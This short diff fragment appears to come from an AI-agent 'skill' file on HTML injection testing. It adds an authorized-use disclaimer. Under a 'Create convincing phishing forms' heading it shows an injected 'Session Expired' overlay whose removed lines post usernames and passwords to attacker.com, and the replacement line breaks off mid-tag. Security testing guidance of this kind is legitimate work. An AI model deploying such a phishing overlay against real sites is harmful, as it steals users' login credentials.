@@ -8,6 +8,8 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/html
 ---
 
 
+> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
+
 # HTML Injection Testing
 
 ## Purpose
@@ -207,6 +209,4 @@ Create convincing phishing forms:
             background:white;z-index:9999;padding:50px;">
     <h2>Session Expired</h2>
     <p>Your session has expired. Please log in again.</p>
-    <form action="http://attacker.com/capture" method="POST">
-        <label>Username:</label><br>
-        <input type="text" name="username" style="width:2
+    <form act
